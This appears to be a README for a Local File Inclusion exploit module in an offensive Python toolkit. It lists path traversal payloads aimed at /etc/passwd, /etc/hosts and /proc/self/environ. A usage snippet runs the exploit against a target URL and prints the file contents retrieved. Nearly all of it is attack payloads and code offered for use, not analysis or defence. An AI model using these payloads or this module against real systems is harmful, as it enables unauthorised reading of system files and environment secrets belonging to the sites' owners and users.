LFI Exploit Module

Description

Local File Inclusion exploitation with path traversal payloads.

Payloads

../../../etc/passwd
../../../../etc/passwd
../../../etc/hosts
../../../proc/self/environ

Usage

from exploits.lfi_exploit import LFIExploit

lfi = LFIExploit()
result = lfi.execute("https://target.com/view?file=index.html")
if result["vulnerable"]:
    print(f"LFI found! File contents: {result['contents'][0]}")
